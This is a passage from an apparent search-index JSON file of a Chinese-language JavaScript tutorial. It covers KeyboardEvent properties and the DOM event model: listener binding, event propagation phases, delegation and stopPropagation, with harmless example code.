\u63a5\u53e3\u6982\u8ff0"},{"location":"events/keyboard/#keyboardevent_1","text":"","title":"KeyboardEvent \u7684\u5b9e\u4f8b\u5c5e\u6027"},{"location":"events/keyboard/#keyboardeventaltkeykeyboardeventctrlkeykeyboardeventmetakeykeyboardeventshiftkey","text":"\u4ee5\u4e0b\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u6309\u4e0b\u5bf9\u5e94\u7684\u952e\u3002 KeyboardEvent.altKey \uff1a\u662f\u5426\u6309\u4e0b Alt \u952e KeyboardEvent.ctrlKey \uff1a\u662f\u5426\u6309\u4e0b Ctrl \u952e KeyboardEvent.metaKey \uff1a\u662f\u5426\u6309\u4e0b meta \u952e\uff08Mac \u7cfb\u7edf\u662f\u4e00\u4e2a\u56db\u74e3\u7684\u5c0f\u82b1\uff0cWindows \u7cfb\u7edf\u662f windows \u952e\uff09 KeyboardEvent.shiftKey \uff1a\u662f\u5426\u6309\u4e0b Shift \u952e \u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u3002 1 2 3 4 5 6 7 8 function showChar ( e ) { console . log ( 'ALT: ' + e . altKey ); console . log ( 'CTRL: ' + e . ctrlKey ); console . log ( 'Meta: ' + e . metaKey ); console . log ( 'Shift: ' + e . shiftKey ); } document . body . addEventListener ( 'keydown' , showChar , false );","title":"KeyboardEvent.altKey\uff0cKeyboardEvent.ctrlKey\uff0cKeyboardEvent.metaKey\uff0cKeyboardEvent.shiftKey"},{"location":"events/keyboard/#keyboardeventcode","text":"KeyboardEvent.code \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6309\u4e0b\u7684\u952e\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u7528\u952e\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u5176\u4ed6\u952e\u8bf7\u67e5 \u6587\u6863 \u3002 \u6570\u5b57\u952e0 - 9\uff1a\u8fd4\u56de digit0 - digit9 \u5b57\u6bcd\u952eA - z\uff1a\u8fd4\u56de KeyA - KeyZ \u529f\u80fd\u952eF1 - F12\uff1a\u8fd4\u56de F1 - F12 \u65b9\u5411\u952e\uff1a\u8fd4\u56de ArrowDown \u3001 ArrowUp \u3001 ArrowLeft \u3001 ArrowRight Alt \u952e\uff1a\u8fd4\u56de AltLeft \u6216 AltRight Shift \u952e\uff1a\u8fd4\u56de ShiftLeft \u6216 ShiftRight Ctrl \u952e\uff1a\u8fd4\u56de ControlLeft \u6216 ControlRight","title":"KeyboardEvent.code"},{"location":"events/keyboard/#keyboardeventkey","text":"KeyboardEvent.key \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6309\u4e0b\u7684\u952e\u540d\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u5982\u679c\u6309\u4e0b\u7684\u952e\u4ee3\u8868\u53ef\u6253\u5370\u5b57\u7b26\uff0c\u5219\u8fd4\u56de\u8fd9\u4e2a\u5b57\u7b26\uff0c\u6bd4\u5982\u6570\u5b57\u3001\u5b57\u6bcd\u3002 \u5982\u679c\u6309\u4e0b\u7684\u952e\u4ee3\u8868\u4e0d\u53ef\u6253\u5370\u7684\u7279\u6b8a\u5b57\u7b26\uff0c\u5219\u8fd4\u56de\u9884\u5b9a\u4e49\u7684\u952e\u503c\uff0c\u6bd4\u5982 Backspace\uff0cTab\uff0cEnter\uff0cShift\uff0cControl\uff0cAlt\uff0cCapsLock\uff0cEsc\uff0cSpacebar\uff0cPageUp\uff0cPageDown\uff0cEnd\uff0cHome\uff0cLeft\uff0cRight\uff0cUp\uff0cDown\uff0cPrintScreen\uff0cInsert\uff0cDel\uff0cWin\uff0cF1\uff5eF12\uff0cNumLock\uff0cScroll \u7b49\u3002 \u5982\u679c\u540c\u65f6\u6309\u4e0b\u4e00\u4e2a\u63a7\u5236\u952e\u548c\u4e00\u4e2a\u7b26\u53f7\u952e\uff0c\u5219\u8fd4\u56de\u7b26\u53f7\u952e\u7684\u952e\u540d\u3002\u6bd4\u5982\uff0c\u6309\u4e0b Ctrl + a\uff0c\u5219\u8fd4\u56de a \uff1b\u6309\u4e0b Shift + a\uff0c\u5219\u8fd4\u56de\u5927\u5199\u7684 A \u3002 \u5982\u679c\u65e0\u6cd5\u8bc6\u522b\u952e\u540d\uff0c\u8fd4\u56de\u5b57\u7b26\u4e32 Unidentified \u3002","title":"KeyboardEvent.key"},{"location":"events/keyboard/#keyboardeventlocation","text":"KeyboardEvent.location \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u6309\u4e0b\u7684\u952e\u5904\u5728\u952e\u76d8\u7684\u54ea\u4e00\u4e2a\u533a\u57df\u3002\u5b83\u53ef\u80fd\u53d6\u4ee5\u4e0b\u503c\u3002 0\uff1a\u5904\u5728\u952e\u76d8\u7684\u4e3b\u533a\u57df\uff0c\u6216\u8005\u65e0\u6cd5\u5224\u65ad\u5904\u4e8e\u54ea\u4e00\u4e2a\u533a\u57df\u3002 1\uff1a\u5904\u5728\u952e\u76d8\u7684\u5de6\u4fa7\uff0c\u53ea\u9002\u7528\u90a3\u4e9b\u6709\u4e24\u4e2a\u4f4d\u7f6e\u7684\u952e\uff08\u6bd4\u5982 Ctrl \u548c Shift \u952e\uff09\u3002 2\uff1a\u5904\u5728\u952e\u76d8\u7684\u53f3\u4fa7\uff0c\u53ea\u9002\u7528\u90a3\u4e9b\u6709\u4e24\u4e2a\u4f4d\u7f6e\u7684\u952e\uff08\u6bd4\u5982 Ctrl \u548c Shift \u952e\uff09\u3002 3\uff1a\u5904\u5728\u6570\u5b57\u5c0f\u952e\u76d8\u3002","title":"KeyboardEvent.location"},{"location":"events/keyboard/#keyboardeventrepeat","text":"KeyboardEvent.repeat \u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u4ee3\u8868\u8be5\u952e\u662f\u5426\u88ab\u6309\u7740\u4e0d\u653e\uff0c\u4ee5\u4fbf\u5224\u65ad\u662f\u5426\u91cd\u590d\u8fd9\u4e2a\u952e\uff0c\u5373\u6d4f\u89c8\u5668\u4f1a\u6301\u7eed\u89e6\u53d1 keydown \u548c keypress \u4e8b\u4ef6\uff0c\u76f4\u5230\u7528\u6237\u677e\u5f00\u624b\u4e3a\u6b62\u3002","title":"KeyboardEvent.repeat"},{"location":"events/keyboard/#keyboardevent_2","text":"","title":"KeyboardEvent \u7684\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"events/keyboard/#keyboardeventgetmodifierstate","text":"KeyboardEvent.getModifierState() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u6309\u4e0b\u6216\u6fc0\u6d3b\u6307\u5b9a\u7684\u529f\u80fd\u952e\u3002\u5b83\u7684\u5e38\u7528\u53c2\u6570\u5982\u4e0b\u3002 Alt \uff1aAlt \u952e CapsLock \uff1a\u5927\u5199\u9501\u5b9a\u952e Control \uff1aCtrl \u952e Meta \uff1aMeta \u952e NumLock \uff1a\u6570\u5b57\u952e\u76d8\u5f00\u5173\u952e Shift \uff1aShift \u952e 1 2 3 4 5 6 7 if ( event . getModifierState ( 'Control' ) + event . getModifierState ( 'Alt' ) + event . getModifierState ( 'Meta' ) > 1 ) { return ; } \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u53ea\u8981 Control \u3001 Alt \u3001 Meta \u91cc\u9762\uff0c\u540c\u65f6\u6309\u4e0b\u4efb\u610f\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684\u952e\u5c31\u8fd4\u56de\u3002","title":"KeyboardEvent.getModifierState()"},{"location":"events/model/","text":"\u4e8b\u4ef6\u6a21\u578b \u00b6 \u76d1\u542c\u51fd\u6570 \u00b6 \u6d4f\u89c8\u5668\u7684\u4e8b\u4ef6\u6a21\u578b\uff0c\u5c31\u662f\u901a\u8fc7\u76d1\u542c\u51fd\u6570\uff08listener\uff09\u5bf9\u4e8b\u4ef6\u505a\u51fa\u53cd\u5e94\u3002\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u6d4f\u89c8\u5668\u76d1\u542c\u5230\u4e86\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684\u76d1\u542c\u51fd\u6570\u3002\u8fd9\u662f\u4e8b\u4ef6\u9a71\u52a8\u7f16\u7a0b\u6a21\u5f0f\uff08event-driven\uff09\u7684\u4e3b\u8981\u7f16\u7a0b\u65b9\u5f0f\u3002 JavaScript \u6709\u4e09\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u4e3a\u4e8b\u4ef6\u7ed1\u5b9a\u76d1\u542c\u51fd\u6570\u3002 HTML \u7684 on- \u5c5e\u6027 \u00b6 HTML \u8bed\u8a00\u5141\u8bb8\u5728\u5143\u7d20\u7684\u5c5e\u6027\u4e2d\uff0c\u76f4\u63a5\u5b9a\u4e49\u67d0\u4e9b\u4e8b\u4ef6\u7684\u76d1\u542c\u4ee3\u7801\u3002 1 2 < body onload = \"doSomething()\" > < div onclick = \"console.log('\u89e6\u53d1\u4e8b\u4ef6')\" > \u4e0a\u9762\u4ee3\u7801\u4e3a body \u8282\u70b9\u7684 load \u4e8b\u4ef6\u3001 div \u8282\u70b9\u7684 click \u4e8b\u4ef6\uff0c\u6307\u5b9a\u4e86\u76d1\u542c\u4ee3\u7801\u3002\u4e00\u65e6\u4e8b\u4ef6\u53d1\u751f\uff0c\u5c31\u4f1a\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u3002 \u5143\u7d20\u7684\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027\uff0c\u90fd\u662f on \u52a0\u4e0a\u4e8b\u4ef6\u540d\uff0c\u6bd4\u5982 onload \u5c31\u662f on + load \uff0c\u8868\u793a load \u4e8b\u4ef6\u7684\u76d1\u542c\u4ee3\u7801\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e9b\u5c5e\u6027\u7684\u503c\u662f\u5c06\u4f1a\u6267\u884c\u7684\u4ee3\u7801\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u51fd\u6570\u3002 1 2 3 4 5 <!-- \u6b63\u786e --> < body onload = \"doSomething()\" > <!-- \u9519\u8bef --> < body onload = \"doSomething\" > \u4e00\u65e6\u6307\u5b9a\u7684\u4e8b\u4ef6\u53d1\u751f\uff0c on- \u5c5e\u6027\u7684\u503c\u662f\u539f\u6837\u4f20\u5165 JavaScript \u5f15\u64ce\u6267\u884c\u3002\u56e0\u6b64\u5982\u679c\u8981\u6267\u884c\u51fd\u6570\uff0c\u4e0d\u8981\u5fd8\u8bb0\u52a0\u4e0a\u4e00\u5bf9\u5706\u62ec\u53f7\u3002 \u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6307\u5b9a\u7684\u76d1\u542c\u4ee3\u7801\uff0c\u53ea\u4f1a\u5728\u5192\u6ce1\u9636\u6bb5\u89e6\u53d1\u3002 1 2 3 < div onclick = \"console.log(2)\" > < button onclick = \"console.log(1)\" > \u70b9\u51fb </ button > </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <button> \u662f <div> \u7684\u5b50\u5143\u7d20\u3002 <button> \u7684 click \u4e8b\u4ef6\uff0c\u4e5f\u4f1a\u89e6\u53d1 <div> \u7684 click \u4e8b\u4ef6\u3002\u7531\u4e8e on- \u5c5e\u6027\u7684\u76d1\u542c\u4ee3\u7801\uff0c\u53ea\u5728\u5192\u6ce1\u9636\u6bb5\u89e6\u53d1\uff0c\u6240\u4ee5\u70b9\u51fb\u7ed3\u679c\u662f\u5148\u8f93\u51fa 1 \uff0c\u518d\u8f93\u51fa 2 \uff0c\u5373\u4e8b\u4ef6\u4ece\u5b50\u5143\u7d20\u5f00\u59cb\u5192\u6ce1\u5230\u7236\u5143\u7d20\u3002 \u76f4\u63a5\u8bbe\u7f6e on- \u5c5e\u6027\uff0c\u4e0e\u901a\u8fc7\u5143\u7d20\u8282\u70b9\u7684 setAttribute \u65b9\u6cd5\u8bbe\u7f6e on- \u5c5e\u6027\uff0c\u6548\u679c\u662f\u4e00\u6837\u7684\u3002 1 2 3 el . setAttribute ( 'onclick' , 'doSomething()' ); // \u7b49\u540c\u4e8e // <Element onclick=\"doSomething()\"> \u5143\u7d20\u8282\u70b9\u7684\u4e8b\u4ef6\u5c5e\u6027 \u00b6 \u5143\u7d20\u8282\u70b9\u5bf9\u8c61\u7684\u4e8b\u4ef6\u5c5e\u6027\uff0c\u540c\u6837\u53ef\u4ee5\u6307\u5b9a\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 window . onload = doSomething ; div . onclick = function ( event ) { console . log ( '\u89e6\u53d1\u4e8b\u4ef6' ); }; \u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6307\u5b9a\u7684\u76d1\u542c\u51fd\u6570\uff0c\u4e5f\u662f\u53ea\u4f1a\u5728\u5192\u6ce1\u9636\u6bb5\u89e6\u53d1\u3002 \u6ce8\u610f\uff0c\u8fd9\u79cd\u65b9\u6cd5\u4e0e HTML \u7684 on- \u5c5e\u6027\u7684\u5dee\u5f02\u662f\uff0c\u5b83\u7684\u503c\u662f\u51fd\u6570\u540d\uff08 doSomething \uff09\uff0c\u800c\u4e0d\u50cf\u540e\u8005\uff0c\u5fc5\u987b\u7ed9\u51fa\u5b8c\u6574\u7684\u76d1\u542c\u4ee3\u7801\uff08 doSomething() \uff09\u3002 EventTarget.addEventListener() \u00b6 \u6240\u6709 DOM \u8282\u70b9\u5b9e\u4f8b\u90fd\u6709 addEventListener \u65b9\u6cd5\uff0c\u7528\u6765\u4e3a\u8be5\u8282\u70b9\u5b9a\u4e49\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 1 window . addEventListener ( 'load' , doSomething , false ); addEventListener \u65b9\u6cd5\u7684\u8be6\u7ec6\u4ecb\u7ecd\uff0c\u53c2\u89c1 EventTarget \u7ae0\u8282\u3002 \u5c0f\u7ed3 \u00b6 \u4e0a\u9762\u4e09\u79cd\u65b9\u6cd5\uff0c\u7b2c\u4e00\u79cd\u201cHTML \u7684 on- \u5c5e\u6027\u201d\uff0c\u8fdd\u53cd\u4e86 HTML \u4e0e JavaScript \u4ee3\u7801\u76f8\u5206\u79bb\u7684\u539f\u5219\uff0c\u5c06\u4e24\u8005\u5199\u5728\u4e00\u8d77\uff0c\u4e0d\u5229\u4e8e\u4ee3\u7801\u5206\u5de5\uff0c\u56e0\u6b64\u4e0d\u63a8\u8350\u4f7f\u7528\u3002 \u7b2c\u4e8c\u79cd\u201c\u5143\u7d20\u8282\u70b9\u7684\u4e8b\u4ef6\u5c5e\u6027\u201d\u7684\u7f3a\u70b9\u5728\u4e8e\uff0c\u540c\u4e00\u4e2a\u4e8b\u4ef6\u53ea\u80fd\u5b9a\u4e49\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u5b9a\u4e49\u4e24\u6b21 onclick \u5c5e\u6027\uff0c\u540e\u4e00\u6b21\u5b9a\u4e49\u4f1a\u8986\u76d6\u524d\u4e00\u6b21\u3002\u56e0\u6b64\uff0c\u4e5f\u4e0d\u63a8\u8350\u4f7f\u7528\u3002 \u7b2c\u4e09\u79cd EventTarget.addEventListener \u662f\u63a8\u8350\u7684\u6307\u5b9a\u76d1\u542c\u51fd\u6570\u7684\u65b9\u6cd5\u3002\u5b83\u6709\u5982\u4e0b\u4f18\u70b9\uff1a \u540c\u4e00\u4e2a\u4e8b\u4ef6\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u76d1\u542c\u51fd\u6570\u3002 \u80fd\u591f\u6307\u5b9a\u5728\u54ea\u4e2a\u9636\u6bb5\uff08\u6355\u83b7\u9636\u6bb5\u8fd8\u662f\u5192\u6ce1\u9636\u6bb5\uff09\u89e6\u53d1\u76d1\u542c\u51fd\u6570\u3002 \u9664\u4e86 DOM \u8282\u70b9\uff0c\u5176\u4ed6\u5bf9\u8c61\uff08\u6bd4\u5982 window \u3001 XMLHttpRequest \u7b49\uff09\u4e5f\u6709\u8fd9\u4e2a\u63a5\u53e3\uff0c\u5b83\u7b49\u4e8e\u662f\u6574\u4e2a JavaScript \u7edf\u4e00\u7684\u76d1\u542c\u51fd\u6570\u63a5\u53e3\u3002 this \u7684\u6307\u5411 \u00b6 \u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684 this \u6307\u5411\u89e6\u53d1\u4e8b\u4ef6\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\u3002 1 < button id = \"btn\" onclick = \"console.log(this.id)\" > \u70b9\u51fb </ button > \u6267\u884c\u4e0a\u9762\u4ee3\u7801\uff0c\u70b9\u51fb\u540e\u4f1a\u8f93\u51fa btn \u3002 \u5176\u4ed6\u4e24\u79cd\u76d1\u542c\u51fd\u6570\u7684\u5199\u6cd5\uff0c this \u7684\u6307\u5411\u4e5f\u662f\u5982\u6b64\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // HTML \u4ee3\u7801\u5982\u4e0b // <button id=\"btn\">\u70b9\u51fb</button> var btn = document . getElementById ( 'btn' ); // \u5199\u6cd5\u4e00 btn . onclick = function () { console . log ( this . id ); }; // \u5199\u6cd5\u4e8c btn . addEventListener ( 'click' , function ( e ) { console . log ( this . id ); }, false ); \u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\uff0c\u70b9\u51fb\u6309\u94ae\u4ee5\u540e\u4e5f\u662f\u8f93\u51fa btn \u3002 \u4e8b\u4ef6\u7684\u4f20\u64ad \u00b6 \u4e00\u4e2a\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u4f1a\u5728\u5b50\u5143\u7d20\u548c\u7236\u5143\u7d20\u4e4b\u95f4\u4f20\u64ad\uff08propagation\uff09\u3002\u8fd9\u79cd\u4f20\u64ad\u5206\u6210\u4e09\u4e2a\u9636\u6bb5\u3002 \u7b2c\u4e00\u9636\u6bb5 \uff1a\u4ece window \u5bf9\u8c61\u4f20\u5bfc\u5230\u76ee\u6807\u8282\u70b9\uff08\u4e0a\u5c42\u4f20\u5230\u5e95\u5c42\uff09\uff0c\u79f0\u4e3a\u201c\u6355\u83b7\u9636\u6bb5\u201d\uff08capture phase\uff09\u3002 \u7b2c\u4e8c\u9636\u6bb5 \uff1a\u5728\u76ee\u6807\u8282\u70b9\u4e0a\u89e6\u53d1\uff0c\u79f0\u4e3a\u201c\u76ee\u6807\u9636\u6bb5\u201d\uff08target phase\uff09\u3002 \u7b2c\u4e09\u9636\u6bb5 \uff1a\u4ece\u76ee\u6807\u8282\u70b9\u4f20\u5bfc\u56de window \u5bf9\u8c61\uff08\u4ece\u5e95\u5c42\u4f20\u56de\u4e0a\u5c42\uff09\uff0c\u79f0\u4e3a\u201c\u5192\u6ce1\u9636\u6bb5\u201d\uff08bubbling phase\uff09\u3002 \u8fd9\u79cd\u4e09\u9636\u6bb5\u7684\u4f20\u64ad\u6a21\u578b\uff0c\u4f7f\u5f97\u540c\u4e00\u4e2a\u4e8b\u4ef6\u4f1a\u5728\u591a\u4e2a\u8282\u70b9\u4e0a\u89e6\u53d1\u3002 1 2 3 < div > < p > \u70b9\u51fb </ p > </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c <div> \u8282\u70b9\u4e4b\u4e2d\u6709\u4e00\u4e2a <p> \u8282\u70b9\u3002 \u5982\u679c\u5bf9\u8fd9\u4e24\u4e2a\u8282\u70b9\uff0c\u90fd\u8bbe\u7f6e click \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff08\u6bcf\u4e2a\u8282\u70b9\u7684\u6355\u83b7\u9636\u6bb5\u548c\u5192\u6ce1\u9636\u6bb5\uff0c\u5404\u8bbe\u7f6e\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff09\uff0c\u5171\u8ba1\u8bbe\u7f6e\u56db\u4e2a\u76d1\u542c\u51fd\u6570\u3002\u7136\u540e\uff0c\u5bf9 <p> \u70b9\u51fb\uff0c click \u4e8b\u4ef6\u4f1a\u89e6\u53d1\u56db\u6b21\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 var phases = { 1 : 'capture' , 2 : 'target' , 3 : 'bubble' }; var div = document . querySelector ( 'div' ); var p = document . querySelector ( 'p' ); div . addEventListener ( 'click' , callback , true ); p . addEventListener ( 'click' , callback , true ); div . addEventListener ( 'click' , callback , false ); p . addEventListener ( 'click' , callback , false ); function callback ( event ) { var tag = event . currentTarget . tagName ; var phase = phases [ event . eventPhase ]; console . log ( \"Tag: '\" + tag + \"'. EventPhase: '\" + phase + \"'\" ); } // \u70b9\u51fb\u4ee5\u540e\u7684\u7ed3\u679c // Tag: 'DIV'. EventPhase: 'capture' // Tag: 'P'. EventPhase: 'target' // Tag: 'P'. EventPhase: 'target' // Tag: 'DIV'. EventPhase: 'bubble' \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c click \u4e8b\u4ef6\u88ab\u89e6\u53d1\u4e86\u56db\u6b21\uff1a <div> \u8282\u70b9\u7684\u6355\u83b7\u9636\u6bb5\u548c\u5192\u6ce1\u9636\u6bb5\u54041\u6b21\uff0c <p> \u8282\u70b9\u7684\u76ee\u6807\u9636\u6bb5\u89e6\u53d1\u4e862\u6b21\u3002 \u6355\u83b7\u9636\u6bb5\uff1a\u4e8b\u4ef6\u4ece <div> \u5411 <p> \u4f20\u64ad\u65f6\uff0c\u89e6\u53d1 <div> \u7684 click \u4e8b\u4ef6\uff1b \u76ee\u6807\u9636\u6bb5\uff1a\u4e8b\u4ef6\u4ece <div> \u5230\u8fbe <p> \u65f6\uff0c\u89e6\u53d1 <p> \u7684 click \u4e8b\u4ef6\uff1b \u5192\u6ce1\u9636\u6bb5\uff1a\u4e8b\u4ef6\u4ece <p> \u4f20\u56de <div> \u65f6\uff0c\u518d\u6b21\u89e6\u53d1 <div> \u7684 click \u4e8b\u4ef6\u3002 \u5176\u4e2d\uff0c <p> \u8282\u70b9\u6709\u4e24\u4e2a\u76d1\u542c\u51fd\u6570\uff08 addEventListener \u65b9\u6cd5\u7b2c\u4e09\u4e2a\u53c2\u6570\u7684\u4e0d\u540c\uff0c\u4f1a\u5bfc\u81f4\u7ed1\u5b9a\u4e24\u4e2a\u76d1\u542c\u51fd\u6570\uff09\uff0c\u56e0\u6b64\u5b83\u4eec\u90fd\u4f1a\u56e0\u4e3a click \u4e8b\u4ef6\u89e6\u53d1\u4e00\u6b21\u3002\u6240\u4ee5\uff0c <p> \u4f1a\u5728 target \u9636\u6bb5\u6709\u4e24\u6b21\u8f93\u51fa\u3002 \u6ce8\u610f\uff0c\u6d4f\u89c8\u5668\u603b\u662f\u5047\u5b9a click \u4e8b\u4ef6\u7684\u76ee\u6807\u8282\u70b9\uff0c\u5c31\u662f\u70b9\u51fb\u4f4d\u7f6e\u5d4c\u5957\u6700\u6df1\u7684\u90a3\u4e2a\u8282\u70b9\uff08\u672c\u4f8b\u662f <div> \u8282\u70b9\u91cc\u9762\u7684 <p> \u8282\u70b9\uff09\u3002\u6240\u4ee5\uff0c <p> \u8282\u70b9\u7684\u6355\u83b7\u9636\u6bb5\u548c\u5192\u6ce1\u9636\u6bb5\uff0c\u90fd\u4f1a\u663e\u793a\u4e3a target \u9636\u6bb5\u3002 \u4e8b\u4ef6\u4f20\u64ad\u7684\u6700\u4e0a\u5c42\u5bf9\u8c61\u662f window \uff0c\u63a5\u7740\u4f9d\u6b21\u662f document \uff0c html \uff08 document.documentElement \uff09\u548c body \uff08 document.body \uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0a\u4f8b\u7684\u4e8b\u4ef6\u4f20\u64ad\u987a\u5e8f\uff0c\u5728\u6355\u83b7\u9636\u6bb5\u4f9d\u6b21\u4e3a window \u3001 document \u3001 html \u3001 body \u3001 div \u3001 p \uff0c\u5728\u5192\u6ce1\u9636\u6bb5\u4f9d\u6b21\u4e3a p \u3001 div \u3001 body \u3001 html \u3001 document \u3001 window \u3002 \u4e8b\u4ef6\u7684\u4ee3\u7406 \u00b6 \u7531\u4e8e\u4e8b\u4ef6\u4f1a\u5728\u5192\u6ce1\u9636\u6bb5\u5411\u4e0a\u4f20\u64ad\u5230\u7236\u8282\u70b9\uff0c\u56e0\u6b64\u53ef\u4ee5\u628a\u5b50\u8282\u70b9\u7684\u76d1\u542c\u51fd\u6570\u5b9a\u4e49\u5728\u7236\u8282\u70b9\u4e0a\uff0c\u7531\u7236\u8282\u70b9\u7684\u76d1\u542c\u51fd\u6570\u7edf\u4e00\u5904\u7406\u591a\u4e2a\u5b50\u5143\u7d20\u7684\u4e8b\u4ef6\u3002\u8fd9\u79cd\u65b9\u6cd5\u53eb\u505a\u4e8b\u4ef6\u7684\u4ee3\u7406\uff08delegation\uff09\u3002 1 2 3 4 5 6 7 var ul = document . querySelector ( 'ul' ); ul . addEventListener ( 'click' , function ( event ) { if ( event . target . tagName . toLowerCase () === 'li' ) { // some code } }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c click \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u5b9a\u4e49\u5728 <ul> \u8282\u70b9\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u5b83\u5904\u7406\u7684\u662f\u5b50\u8282\u70b9 <li> \u7684 click \u4e8b\u4ef6\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\uff0c\u53ea\u8981\u5b9a\u4e49\u4e00\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u5c31\u80fd\u5904\u7406\u591a\u4e2a\u5b50\u8282\u70b9\u7684\u4e8b\u4ef6\uff0c\u800c\u4e0d\u7528\u5728\u6bcf\u4e2a <li> \u8282\u70b9\u4e0a\u5b9a\u4e49\u76d1\u542c\u51fd\u6570\u3002\u800c\u4e14\u4ee5\u540e\u518d\u6dfb\u52a0\u5b50\u8282\u70b9\uff0c\u76d1\u542c\u51fd\u6570\u4f9d\u7136\u6709\u6548\u3002 \u5982\u679c\u5e0c\u671b\u4e8b\u4ef6\u5230\u67d0\u4e2a\u8282\u70b9\u4e3a\u6b62\uff0c\u4e0d\u518d\u4f20\u64ad\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e8b\u4ef6\u5bf9\u8c61\u7684 stopPropagation \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 // \u4e8b\u4ef6\u4f20\u64ad\u5230 p \u5143\u7d20\u540e\uff0c\u5c31\u4e0d\u518d\u5411\u4e0b\u4f20\u64ad\u4e86 p . addEventListener ( 'click' , function ( event ) { event . stopPropagation (); }, true ); // \u4e8b\u4ef6\u5192\u6ce1\u5230 p \u5143\u7d20\u540e\uff0c\u5c31\u4e0d\u518d\u5411\u4e0a\u5192\u6ce1\u4e86 p . addEventListener ( 'click' , function ( event ) { event . stopPropagation (); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c stopPropagation \u65b9\u6cd5\u5206\u522b\u5728\u6355\u83b7\u9636\u6bb5\u548c\u5192\u6ce1\u9636\u6bb5\uff0c\u963b\u6b62\u4e86\u4e8b\u4ef6\u7684\u4f20\u64ad\u3002 \u4f46\u662f\uff0c stopPropagation \u65b9\u6cd5\u53ea\u4f1a\u963b\u6b62\u4e8b\u4ef6\u7684\u4f20\u64ad\uff0c\u4e0d\u4f1a\u963b\u6b62\u8be5\u4e8b\u4ef6\u89e6\u53d1 <p> \u8282\u70b9\u7684\u5176\u4ed6 click \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u662f\u5f7b\u5e95\u53d6\u6d88 click \u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 8 9 p . addEventListener ( 'click' , function ( event ) { event . stopPropagation (); console . log ( 1 ); }); p . addEventListener ( 'click' , function ( event ) { // \u4f1a\u89e6\u53d1 console . log ( 2 ); }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u5143\u7d20\u7ed1\u5b9a\u4e86\u4e24\u4e2a click \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 stopPropagation \u65b9\u6cd5\u53ea\u80fd\u963b\u6b62\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u4f20\u64ad\uff0c\u4e0d\u80fd\u53d6\u6d88\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u56e0\u6b64\uff0c\u7b2c\u4e8c\u4e2a\u76d1\u542c\u51fd\u6570\u4f1a\u89e6\u53d1\u3002\u8f93\u51fa\u7ed3\u679c\u4f1a\u5148\u662f1\uff0c\u7136\u540e\u662f2\u3002 \u5982\u679c\u60f3\u8981\u5f7b\u5e95\u53d6\u6d88\u8be5\u4e8b\u4ef6\uff0c\u4e0d\u518d\u89e6\u53d1\u540e\u9762\u6240\u6709 click \u7684\u76d1\u542c\u51fd\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528 stopImmediatePropagation \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 p . addEventListener ( 'click' , function ( event ) { event . stopImmediatePropagation (); console . log ( 1 ); }); p . 